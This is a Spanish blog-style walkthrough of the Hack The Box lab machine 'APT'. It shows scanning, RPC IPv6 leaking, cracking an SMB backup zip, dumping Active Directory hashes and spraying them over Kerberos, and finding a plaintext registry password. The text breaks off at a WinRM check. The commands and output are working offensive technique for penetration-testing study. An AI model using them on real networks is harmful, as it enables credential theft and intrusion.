@@ -1,0 +1,1441 @@
+---
+layout: post
+title: APT
+date: 2023-01-24
+description: 
+img:
+fig-caption:
+tags: [OSCP, OSEP]
+---
+___
+
+<center><img src="/writeups/assets/img/APT-htb/APT_banner.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+* Enumeración por RPC
+
+* Information Leakeage (Dirección IPV6)
+
+* Enumeración por SMB IPV6
+
+* Enumeración NTDS
+
+* Enumeración por Kerberos
+
+* SMB Hash Sprying
+
+* Enumeración de los registros de forma remota
+
+* Evasión de Windows Defender (Bypass-4MSI para desactivar AMSI)
+
+* Abuso de Windows Defender para leakear hash NetNTLMv1 del Account Manager
+
+* Abuso del soporte NTLMv1
+
+* Dumpeo de hashes NT
+
+* PasstheHash
+
+* Modificación de RoguePotato.exe para funcione por IPv6 [EXTRA]
+
+* Analisis de código en C++ con Visual Studio [EXTRA]
+
+* Compilación de Binario customizado [EXTRA]
+
+* Evasión de Windows Defender (Nivel Medio-Avanzado) [EXTRA]
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv 10.10.10.213 -oG openports
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 08:41 GMT
+Initiating SYN Stealth Scan at 08:41
+Scanning 10.10.10.213 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.213
+Discovered open port 135/tcp on 10.10.10.213
+Completed SYN Stealth Scan at 08:41, 28.03s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.213
+Host is up, received user-set (0.16s latency).
+Scanned at 2023-01-24 08:41:04 GMT for 28s
+Not shown: 65533 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT    STATE SERVICE REASON
+80/tcp  open  http    syn-ack ttl 127
+135/tcp open  msrpc   syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 28.14 seconds
+           Raw packets sent: 131087 (5.768MB) | Rcvd: 20 (880B)
+```
+
+### Escaneo de Servicios y Versiones de cada puerto
+
+```null
+nmap -sCV -p80,135 10.10.10.213 -oN portscan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 08:43 GMT
+Nmap scan report for 10.10.10.213
+Host is up (0.23s latency).
+
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Gigantic Hosting | Home
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.33 seconds
+```
+
+## Puerto 80 (HTTP)
+
+Con whatweb, analizo las tecnologías que se están empleando
+
+```null
+whatweb http://10.10.10.213
+http://10.10.10.213 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sales@gigantichosting.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.213], JQuery, Microsoft-IIS[10.0], Script[application/x-javascript,text/javascript], Title[Gigantic Hosting | Home]
+```
+
+En la página principal aparece lo siguiente:
+
+<img src="/writeups/assets/img/APT-htb/1.png" alt="">
+
+Si aplico fuzzing, no encuentro nada que me sirva
+
+```null
+gobuster dir -u http://10.10.10.213 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x html,asp,aspx,txt
+===============================================================
+Gobuster v3.4
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.213
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.4
+[+] Extensions:              html,asp,aspx,txt
+[+] Timeout:                 10s
+===============================================================
+2023/01/24 08:54:10 Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 14879]
+/images               (Status: 301) [Size: 150] [--> http://10.10.10.213/images/]
+/about.html           (Status: 200) [Size: 9386]
+/news.html            (Status: 200) [Size: 5528]
+/support.html         (Status: 200) [Size: 6326]
+/services.html        (Status: 200) [Size: 10592]
+/Images               (Status: 301) [Size: 150] [--> http://10.10.10.213/Images/]
+/News.html            (Status: 200) [Size: 5528]
+/css                  (Status: 301) [Size: 147] [--> http://10.10.10.213/css/]
+/About.html           (Status: 200) [Size: 9386]
+/Index.html           (Status: 200) [Size: 14879]
+/clients.html         (Status: 200) [Size: 12146]
+/Support.html         (Status: 200) [Size: 6326]
+/js                   (Status: 301) [Size: 146] [--> http://10.10.10.213/js/]
+/Services.html        (Status: 200) [Size: 10592]
+/NEWS.html            (Status: 200) [Size: 5528]
+/fonts                (Status: 301) [Size: 149] [--> http://10.10.10.213/fonts/]
+/IMAGES               (Status: 301) [Size: 150] [--> http://10.10.10.213/IMAGES/]
+/INDEX.html           (Status: 200) [Size: 14879]
+/Fonts                (Status: 301) [Size: 149] [--> http://10.10.10.213/Fonts/]
+/Clients.html         (Status: 200) [Size: 12146]
+/CSS                  (Status: 301) [Size: 147] [--> http://10.10.10.213/CSS/]
+/JS                   (Status: 301) [Size: 146] [--> http://10.10.10.213/JS/]
+/SUPPORT.html         (Status: 200) [Size: 6326]
+/SERVICES.html        (Status: 200) [Size: 10592]
+/ABOUT.html           (Status: 200) [Size: 9386]
+Progress: 1102226 / 1102735 (99.95%)
+===============================================================
+2023/01/24 09:04:36 Finished
+===============================================================
+```
+
+Toda la página es muy estática y está muy por defecto
+
+## Puerto 135 (RPC)
+
+En [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc#identifying-ip-addresses) busco por formas de enumerar este servicio. Existe una forma de conseguir leakear la IPV6 de la máquina víctima, en caso de que sea vulnerable
+
+Descargo IOXIDResolver y lo ejecuto
+
+```null
+git clone https://github.com/mubix/IOXIDResolver
+pip3 install -r requirements.txt
+
+IOXIDResolver.py -t 10.10.10.213
+[*] Retrieving network interface of 10.10.10.213
+Address: apt
+Address: 10.10.10.213
+Address: dead:beef::b885:d62a:d679:573f
+Address: dead:beef::786c:1b92:6f0:da53
+Address: dead:beef::250
+```
+
+Si tramito una traza ICMP por IPV6, la máquina me responde
+
+```null
+ping6 -c1 dead:beef::b885:d62a:d679:573f
+PING dead:beef::b885:d62a:d679:573f(dead:beef::b885:d62a:d679:573f) 56 data bytes
+64 bytes from dead:beef::b885:d62a:d679:573f: icmp_seq=1 ttl=63 time=49.1 ms
+
+--- dead:beef::b885:d62a:d679:573f ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 49.096/49.096/49.096/0.000 ms
+```
+
+La añado al /etc/hosts, para referenciarla con el nombre APT
+
+```null
+echo 'dead:beef::b885:d62a:d679:573f APT' >> /etc/hosts
+```
+
+Ahora vuelvo a hacer el escaneo con nmap pero por IPV6
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv -6 APT -oG openportsipv6
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 09:00 GMT
+Initiating SYN Stealth Scan at 09:00
+Scanning APT (dead:beef::b885:d62a:d679:573f) [65535 ports]
+Discovered open port 135/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 53/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 80/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 445/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 464/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 593/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 49664/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 47001/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 49670/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 3269/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 50413/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 88/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 5985/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 9389/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 49675/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 49665/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 49695/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 636/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 389/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 3268/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 49669/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 49666/tcp on dead:beef::b885:d62a:d679:573f
+Discovered open port 49667/tcp on dead:beef::b885:d62a:d679:573f
+Completed SYN Stealth Scan at 09:00, 41.40s elapsed (65535 total ports)
+Nmap scan report for APT (dead:beef::b885:d62a:d679:573f)
+Host is up, received user-set (0.23s latency).
+Scanned at 2023-01-24 09:00:15 GMT for 42s
+Not shown: 65512 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 63
+80/tcp    open  http             syn-ack ttl 63
+88/tcp    open  kerberos-sec     syn-ack ttl 63
+135/tcp   open  msrpc            syn-ack ttl 63
+389/tcp   open  ldap             syn-ack ttl 63
+445/tcp   open  microsoft-ds     syn-ack ttl 63
+464/tcp   open  kpasswd5         syn-ack ttl 63
+593/tcp   open  http-rpc-epmap   syn-ack ttl 63
+636/tcp   open  ldapssl          syn-ack ttl 63
+3268/tcp  open  globalcatLDAP    syn-ack ttl 63
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 63
+5985/tcp  open  wsman            syn-ack ttl 63
+9389/tcp  open  adws             syn-ack ttl 63
+47001/tcp open  winrm            syn-ack ttl 63
+49664/tcp open  unknown          syn-ack ttl 63
+49665/tcp open  unknown          syn-ack ttl 63
+49666/tcp open  unknown          syn-ack ttl 63
+49667/tcp open  unknown          syn-ack ttl 63
+49669/tcp open  unknown          syn-ack ttl 63
+49670/tcp open  unknown          syn-ack ttl 63
+49675/tcp open  unknown          syn-ack ttl 63
+49695/tcp open  unknown          syn-ack ttl 63
+50413/tcp open  unknown          syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 41.49 seconds
+           Raw packets sent: 196582 (12.581MB) | Rcvd: 46 (2.944KB)
+```
+
+Como tengo acceso a muchos más puertos, aplico un escaneo a todos estos y quiero pensar que todo el reconociento está relacionado por IPV6
+
+```null
+nmap -sCV -p53,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49675,49695,50413 -6 APT -oN portscanipv6
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 09:02 GMT
+Nmap scan report for APT (dead:beef::b885:d62a:d679:573f)
+Host is up (0.054s latency).
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+80/tcp    open  http         Microsoft IIS httpd 10.0
+|_http-title: Gigantic Hosting | Home
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-01-24 09:02:53Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+|_ssl-date: 2023-01-24T09:03:58+00:00; -1s from scanner time.
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+|_ssl-date: 2023-01-24T09:03:58+00:00; -1s from scanner time.
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+|_ssl-date: 2023-01-24T09:03:58+00:00; -1s from scanner time.
+3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+|_ssl-date: 2023-01-24T09:03:58+00:00; -1s from scanner time.
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc        Microsoft Windows RPC
+49675/tcp open  msrpc        Microsoft Windows RPC
+49695/tcp open  msrpc        Microsoft Windows RPC
+50413/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: apt
+|   NetBIOS computer name: APT\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: apt.htb.local
+|_  System time: 2023-01-24T09:03:52+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 0s, deviation: 1s, median: -1s
+| smb2-time: 
+|   date: 2023-01-24T09:03:52
+|_  start_date: 2023-01-24T08:30:27
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.65 seconds
+```
+
+## Puerto 445 (SMB)
+
+Con crackmapexec, aplico un escaneo para ver la versión, dominio y hostname de la máquina
+
+```null
+crackmapexec smb APT
+SMB         APT             445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
+```
+
+Agrego el domino al /etc/hosts, pero apuntando también la dirección IPV6
+
+Con impacket-smbclient, listo los recursos compartidos a nivel de red
+
+```null
+impacket-smbclient APT
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# shares
+backup
+IPC$
+NETLOGON
+SYSVOL
+```
+
+Listo lo que hay dentro del directorio backup
+
+```null
+# use backup
+# ls
+drw-rw-rw-          0  Thu Sep 24 07:31:03 2020 .
+drw-rw-rw-          0  Thu Sep 24 07:31:03 2020 ..
+-rw-rw-rw-   10650961  Thu Sep 24 07:31:03 2020 backup.zip
+```
+
+Me descargo el comprimido
+
+```null
+# get backup.zip
+# exit
+```
+
+Dentro tiene una copia del NTDS
+
+```null
+7z l backup.zip
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz (A0652),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 10650961 bytes (11 MiB)
+
+Listing archive: backup.zip
+
+--
+Path = backup.zip
+Type = zip
+Physical Size = 10650961
+
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+2020-09-23 17:40:25 D....            0            0  Active Directory
+2020-09-23 17:38:20 .....     50331648      8483543  Active Directory/ntds.dit
+2020-09-23 17:38:20 .....        16384          342  Active Directory/ntds.jfm
+2020-09-23 17:40:25 D....            0            0  registry
+2020-09-23 17:22:12 .....       262144         8522  registry/SECURITY
+2020-09-23 17:22:12 .....     12582912      2157644  registry/SYSTEM
+------------------- ----- ------------ ------------  ------------------------
+2020-09-23 17:40:25           63193088     10650051  4 files, 2 folders
+```
+
+Si lo intento descomprimir, me pide una contraseña
+
+```null
+unzip backup.zip -d backup
+Archive:  backup.zip
+   creating: backup/Active Directory/
+[backup.zip] Active Directory/ntds.dit password: 
+```
+
+Creo un hash que me permita romperlo por fuerza bruta con john
+
+```null
+zip2john backup.zip > hash
+```
+
+Encuentro la contraseña
+
+```null
+john -w:/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+iloveyousomuch   (backup.zip)     
+1g 0:00:00:00 DONE (2023-01-24 09:16) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Ahora ya lo puedo descubrir sin problema
+
+```null
+unzip backup.zip -d backup
+Archive:  backup.zip
+   creating: backup/Active Directory/
+[backup.zip] Active Directory/ntds.dit password: 
+  inflating: backup/Active Directory/ntds.dit  
+  inflating: backup/Active Directory/ntds.jfm  
+   creating: backup/registry/
+  inflating: backup/registry/SECURITY  
+  inflating: backup/registry/SYSTEM  
+```
+
+Teniendo el SYSTEM y el ntds.dit, puedo tratar de computar los hashes NT de forma local
+
+```null
+secretsdump.py -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL > ../hashesNT
+```
+
+Me quedo con la parte NT y LM de todo el output
+
+```null
+cat hashesNT | grep ":" | grep -vE "aes|md5" | sponge hashesNT
+```
+
+Por otro lado, me intersa tener los usuarios por separado, para validarlos a través de Kerberos
+
+```null
+cat hashesNT | awk '{print $1}' FS=":" > users
+```
+
+Y los hashes también los guardo
+
+```null
+cat hashesNT | awk '{print $4}' FS=":" | sponge hashesNT
+```
+
+De todos los usuarios, solo unos pocos son válidos
+
+```null
+kerbrute userenum -d htb.local --dc APT users
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 01/24/23 - Ronnie Flathers @ropnop
+
+2023/01/24 09:27:02 >  Using KDC(s):
+2023/01/24 09:27:02 >   APT:88
+
+2023/01/24 09:27:07 >  [+] VALID USERNAME:   Administrator@htb.local
+2023/01/24 09:27:07 >  [+] VALID USERNAME:   APT$@htb.local
+2023/01/24 09:31:03 >  [+] VALID USERNAME:   henry.vinson@htb.local
+```
+
+A la hora de validar el hash de henry.vinson, no es el correcto
+
+```null
+crackmapexec smb APT -u henry.vinson -H 2de80758521541d19cabba480b260e8f
+SMB         APT             445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         APT             445    APT              [-] htb.local\henry.vinson:2de80758521541d19cabba480b260e8f STATUS_LOGON_FAILURE 
+```
+
+Si no requiere de autenticación previa de Kerberos, puedo solicitar un TGT y tratar de crackearlo
+
+```null
+GetNPUsers.py htb.local/ -no-pass -usersfile valid_users
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User APT doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User henry.vinson doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+No se da el caso para ninguno
+
+Pruebo a hacer un hash spraying por SMB por si se da el caso de que otro hash coincida con este usuario, pero la máquina me bloquea
+
+```null
+crackmapexec smb APT  -u 'henry.vinson' -H hashesNT
+SMB         APT             445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         APT             445    APT              [-] htb.local\henry.vinson:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] htb.local\henry.vinson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] htb.local\henry.vinson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] htb.local\henry.vinson:b300272f1cdab4469660d55fe59415cb STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] htb.local\henry.vinson:72791983d95870c0d6dd999e4389b211 STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] htb.local\henry.vinson:9ea25adafeec63e38cef4259d3b15c30 STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] htb.local\henry.vinson:3ae49ec5e6fed82ceea0dc2be77750ab STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] htb.local\henry.vinson:531c98e26cfa3caee2174af495031187 STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] htb.local\henry.vinson:fde29e6cb61b4f7fda1ad5cd2759329d STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] htb.local\henry.vinson:51d368765462e9c5aebc456946d8dc86 STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] htb.local\henry.vinson:273c48fb014f8e5bf9e2918e3bf7bfbd STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] htb.local\henry.vinson:98590500f99a1bee7559e97ad342d995 STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] htb.local\henry.vinson:10cf01167854082e180cf549f63c0285 STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] htb.local\henry.vinson:813f9d0988b9242eec1e45907344b591 STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] htb.local\henry.vinson:6149000a4f3f7c57642cbee1ea70c3e1 STATUS_LOGON_FAILURE 
+SMB         APT             445    APT              [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         APT             445    APT              [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         APT             445    APT              [-] Connection Error: The NETBIOS connection with the remote host timed out.
+^C
+
+[*] Shutting down, please wait...
+```
+
+Por tanto, tengo que aplicar fuerza bruta por Kerberos y no SMB
+
+Kerbrute no contempla aplicar fuerza bruta por hashes NT, pero encontré un issue en Github, en el que se comentaba acerca de otra herramienta que me puede servir, aunque no está del todo funcional
+
+<img src="/writeups/assets/img/APT-htb/2.png" alt="">
+
+Me descargo la herramienta y la retoco
+
+```null
+git clone https://github.com/3gstudent/pyKerbrute
+```
+
+Trabaja por IPV4, así que cambio el tipo de socket para que se comunique por IPV6
+
+En la función principal, introduzco el usuario, dominio, hostname y el diccionario de hashes por el que quiero iterar. Borro todos los parámetros y llamo a la función directamente
+
+```null
+if __name__ == '__main__':
+
+    user_realm = 'htb.local'
+    user_name = 'henry.vinson'
+    kdc_a = 'apt'
+    
+    f = open("/home/rubbx/Desktop/HTB/Machines/APT/hashesNT", "r")
+
+    for hash_ntlm in f.readlines():
+        hash_ntlm = hash_ntlm.strip()
+
+        user_key = (RC4_HMAC, hash_ntlm.decode('hex'))
+
+        passwordspray_tcp(user_realm, user_name, user_key, kdc_a, hash_ntlm)
+```
+
+Trabaja por IPV4, así que cambio el tipo de socket para que se comunique por IPV6
+
+Desde nvim, aplico una sustitución
+
+<img src="/writeups/assets/img/APT-htb/3.png" alt="">
+
+Al ejecutarlo, encuentra un hash válido
+
+```null
+python2 ADPwdSpray.py
+[+] Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
+```
+
+Si lo valido con crackmapexec, me reporta que es válido pero no puedo ganar una shell interactiva por SMB
+
+```null
+crackmapexec smb APT  -u 'henry.vinson' -H 'e53d87d42adaa3ca32bdb34a876cbffb'
+SMB         APT             445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         APT             445    APT              [+] htb.local\henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb 
+```
+
+Por winrm tampoco puedo ganar acceso
+
+```null
+crackmapexec winrm APT  -u 'henry.vinson' -H 'e53d87d42adaa3ca32bdb34a876cbffb'
+SMB         APT             5985   APT              [*] Windows 10.0 Build 14393 (name:APT) (domain:htb.local)
+HTTP        APT             5985   APT              [*] http://APT:5985/wsman
+WINRM       APT             5985   APT              [-] htb.local\henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
+```
+
+Al tener credenciales válidas, podría probar un Kerberoasting Attack e intentar conseguir un TGS de otro usuario
+
+```null
+GetUserSPNs.py htb.local/henry.vinson -hashes :e53d87d42adaa3ca32bdb34a876cbffb
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+No entries found!
+```
+
+Pero no encuentra nada
+
+Por rpcclient puedo enumerar los usuarios del Directorio Activo
+
+```null
+rpcclient -U "henry.vinson" --pw-nt-hash APT
+Password for [WORKGROUP\henry.vinson]:
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[henry.vinson] rid:[0x451]
+user:[henry.vinson_adm] rid:[0x452]
+```
+
+En cuanto a los grupos existentes:
+
+```null
+rpcclient $> enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[Key Admins] rid:[0x20e]
+group:[Enterprise Key Admins] rid:[0x20f]
+group:[DnsUpdateProxy] rid:[0x44f]
+```
+
+Dentro de los Administradores del Dominio, solo aparece un RID, por lo que ningún otro usuario tiene máximimos privilegios
+
+```null
+rpcclient $> querygroupmem 0x200
+	rid:[0x1f4] attr:[0x7]
+```
+
+Como el usuario henry.vinson_adm no lo tenía en el diccionario de usuarios válidos, vuelvo a efectuar un ASPRepRoast Attack
+
+```null
+GetNPUsers.py htb.local/ -no-pass -usersfile valid_users
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User APT doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User henry.vinson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User henry.vinson_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+Pero también requiere de autenticación previa de Kerberos
+
+Puedo tratar de ver los registros de la máquina víctima
+
+Para saber en que consiste que cada uno, me guié de este [Post](https://www.herongyang.com/Windows/Registry-Hives-HKCR-HKCU-HKLM-HKU-HKCC-HCPD.html)
+
+```null
+reg.py htb.local/henry.vinson@APT -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKU
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+HKU
+HKU\Console
+HKU\Control Panel
+HKU\Environment
+HKU\Keyboard Layout
+HKU\Network
+HKU\Software
+HKU\System
+HKU\Volatile Environment
+```
+
+Dentro de Software, destaca un registro
+
+```null
+reg.py htb.local/henry.vinson@APT -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName 'HKU\Software'
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+HKU\Software
+HKU\Software\GiganticHostingManagementSystem
+HKU\Software\Microsoft
+HKU\Software\Policies
+HKU\Software\RegisteredApplications
+HKU\Software\Sysinternals
+HKU\Software\VMware, Inc.
+HKU\Software\Wow6432Node
+HKU\Software\Classes
+```
+
+Está relacionado con el título de la página web principal
+
+<img src="/writeups/assets/img/APT-htb/4.png" alt="">
+
+Y consigo credenciales en texto claro
+
+```null
+reg.py htb.local/henry.vinson@APT -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName 'HKU\Software\GiganticHostingManagementSystem'
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+HKU\Software\GiganticHostingManagementSystem
+        UserName        REG_SZ   henry.vinson_adm
+        PassWord        REG_SZ   G1#Ny5@2dvht
+```
+
+Son válidas por winrm, así que puedo obtener una shell interactiva
+
+```null
+crackmapexec winrm APT  -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
